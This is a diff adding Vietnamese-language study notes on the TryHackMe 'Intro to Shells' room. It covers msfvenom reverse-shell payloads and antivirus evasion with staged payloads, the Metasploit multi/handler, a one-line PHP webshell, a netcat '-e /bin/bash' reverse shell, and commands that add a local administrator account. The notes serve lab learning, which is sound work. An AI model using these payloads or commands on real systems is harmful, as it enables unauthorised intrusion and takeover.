@@ -204,8 +204,108 @@ Lệnh trên có thể đc thực hiện thông qua bất kỳ trình thực thi
 ![image](https://user-images.githubusercontent.com/95600382/149869257-58518fad-93a1-4c44-b01f-734a763989c4.png)\
 Shell code:https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md\
 
+<h2>MsfVenom</h2>
+
+Tạo shell với MsfVenom, vd trong windows:
+```console
+msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>
+```
+![image](https://user-images.githubusercontent.com/95600382/150063757-ca06bc7d-045c-40b2-b0b6-9d8e63cfeeec.png)\
+-f: output format\
+-o: output location và file name\
+LHOST: IP connect về\ 
+LPORT\
+
+2 Khái niệm staged reverse shell payload và stageless reverse shell payload.\
+- Staged payload được gửi thành 2 phần. Phần đầu gọi là `stager`. Đây là phần code sẽ thực thi trực tiếp trên server, kết nối về listener nhưng lại không chứa phần code nào của reverse shell trong nó. Thay vào đó nó sẽ sử dụng kết nối về listener để thực thi payload trực tiếp mà không cần qua ổ cứng trên máy đích nhằm né anti virus.
+(Thus the payload is split into two parts -- a small initial stager, then the bulkier reverse shell code which is downloaded when the stager is activated. Staged payloads require a special listener -- usually the Metasploit multi/handler, which will be covered in the next task.)\
+- Stageless payload phổ biến hơn. Khi được thực thi, nó sẽ ngay lập tức gửi shell về cho listener/
+(Stageless payloads tend to be easier to use and catch; however, they are also bulkier, and are easier for an antivirus or intrusion detection program to discover and remove. Staged payloads are harder to use, but the initial stager is a lot shorter, and is sometimes missed by less-effective antivirus software. Modern day antivirus solutions will also make use of the Anti-Malware Scan Interface (AMSI) to detect the payload as it is loaded into memory by the stager, making staged payloads less effective than they would once have been in this area.)\
+Quy tắc đặt tên cho Payload
+Khi làm việc msfvenom:
+`<OS>/<arch>/<payload>`
+VD:
+`linux/x86/shell_reverse_tcp`
+msfvenom sẽ tạo 1 stageless reverse shell cho Linux x86\
+windows 32 bits: `windows/shell_reverse_tcp`\
+Windows 64 bits: `winows/x64/shell_reverse_tcp`\
+Stageless payload sẽ được đánh dấu với dấu `_`. Staged payload được đánh dấu với `/`. VD windows 64 bits staged Meterpreter payload:
+```
+windows/x64/meterpreter/reverse_tcp
+```
+What command would you use to generate a staged meterpreter reverse shell for a 64bit Linux target, assuming your own IP was 10.10.10.5, and you were listening on port 443? The format for the shell is elf and the output filename should be shell\
+```
+msfvenom -p linux/x86/meterpreter/reverse_tcp -f elf -o shell LHOST=10.10.10.5 LPORT=443   
+```
+<h2>Metasploit multi/handler</h2>
+
+Là một phần không thể thiếu khi sử dụng các staged payload và nó khá là dễ để sử dụng:\
+- Mở Metasploit với `msfconsole`\
+- gõ `use multi/handler` và nhấn Enter\
+- gõ `options` để xem các options khả dụng:
+![image](https://user-images.githubusercontent.com/95600382/150087349-30d240ca-fe21-4f94-89cd-3e336b75196f.png)\
+Có 3 options mà chúng ta cần đặt: payload, LHOST, LPORT. Chúng có thể được đặt với các lệnh sau:\
+```
+set PAYLOAD <payload>
+set LHOST <listen-address>
+set LPORT <listen-port
+```
+Sau khi thiết lập các thông số. Ta có thể sử dụng lệnh `exploit -j` để chạy listener ngầm.
+![image](https://user-images.githubusercontent.com/95600382/150089202-72aacc09-9367-46a7-833c-e3941e5efd64.png)\
+Để metasploit có thể lắng nghe các port < 1024 nó cần được chạy với quyền `sudo`.\
+Tạo shell:
+```
+msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=192.168.231.128 LPORT=443
+```
+Gửi shell đến máy đích thông qua một python http server và chạy shell\
+Ta có thể thấy Metasploit đã nhận kết nối và gửi nốt phần còn lại của payload và tạo một reverse shell cho chúng ta:\
+![image](https://user-images.githubusercontent.com/95600382/150089950-18129d9a-5cf3-4046-8b05-b97ba94fd939.png)\
+Lưu ý rằng do multi/handler chạy ngầm, ta cần sử dụng `sessions 1` để truy cập vào shell.
+
+<h2>WebShells</h2>
+
+Đôi khi chúng ta gặp các trang web cho phép tải lên các nội dung từ máy mình trong đó có cả các tệp thực thi. Lý tưởng nhất là có thể upload code trực tiếp của reverse shell hoặc bind shell nhưng nó chỉ là lý tường.\
+Webshell là một thuât ngữ để chỉ các script chạy trong một web server (thường là PHP hoặc ASP) và có thể thực thi code trên server thông qua nó. Về cơ bản, các command được nhập vào web page thông qua các form HTML hoặc trực tiếp trong các URL và sau đó được thực thi bởi script, và kết quả có thể được trả về và hiển thị ngay trên web page. Thường sử dụng để qua mặt tường lửa.\
+Và PHP vẫn là ngôn ngữ phổ biến nhất dùng cho server side scripting.
+Một VD đơn giản nhất về WebShell:
+```php
+<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
+```
+Nó sẽ thực thi các command có trong query GET và đứng sau tham số ?cmd= và thực hiện với .shell_exec(). pre để đảm bảo rằng các kết quả trả về đúng với format của page.\
+![image](https://user-images.githubusercontent.com/95600382/150091599-4c627f3e-ea8c-442d-963c-17ccb0b17a6f.png)\
+
+<h2>Next Steps</h2>
+
+Vậy bước tiếp theo sau khi đã đẩy Shell và kết nối thành công và j ?
+Trong Linux, ý tưởng ở đây có thể là chúng ta sẽ cố gắng gain access cho user. SSH key thường được lưu ở `/home/<user>/.ssh`. Và sau đó mở phiên SSH vào hệ thống.
+Trong Windows, các lựa chọn sẽ bị giới hạn. Thông thường chỉ lý tưởng khi shell được chạy bởi SYSTEN user hoặc các user admin để có thể thực hiện tạo kết nối RDP, telnet, winexe, psexec, WinRM ,... vào hệ thống.\
+syntax để tạo user và thêm vào gr admin:
+```
+net user <username> <password> /add
+net localgroup administrators <username> /add
+```
+<h2>Practice and Ex</h2>
+
+Try uploading a webshell to the Linux box, then use the command: `nc <LOCAL-IP> <PORT> -e /bin/bash` to send a reverse shell back to a waiting listener on your own machine.\
+Navigate to `/usr/share/webshells/php/php-reverse-shell.php` in Kali and change the IP and port to match your tun0 IP with a custom port. Set up a netcat listener, then upload and activate the shell.\ 
+Log into the Linux machine over SSH using the credentials in task 14. Use the techniques in Task 8 to experiment with bind and reverse netcat shells.\
+Practice reverse and bind shells using Socat on the Linux machine. Try both the normal and special techniques.\
+Look through https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md and try some of the other reverse shell techniques. Try to analyse them and see why they work.\
+Switch to the Windows VM. Try uploading and activating the php-reverse-shell. Does this work?\
+Upload a webshell on the Windows target and try to obtain a reverse shell using Powershell.\
+The webserver is running with SYSTEM privileges. Create a new user and add it to the "administrators" group, then login over RDP or WinRM.\
+Experiment using socat and netcat to obtain reverse and bind shells on the Windows Target.\
+Create a 64bit Windows Meterpreter shell using msfvenom and upload it to the Windows Target. Activate the shell and catch it with multi/handler. Experiment with the features of this shell.\
+Create both staged and stageless meterpreter shells for either target. Upload and manually activate them, catching the shell with netcat -- does this work?\
+https://tryhackme.com/room/introtoshells\
 
 
 
 
-  
+
+
+
+
+
+
+
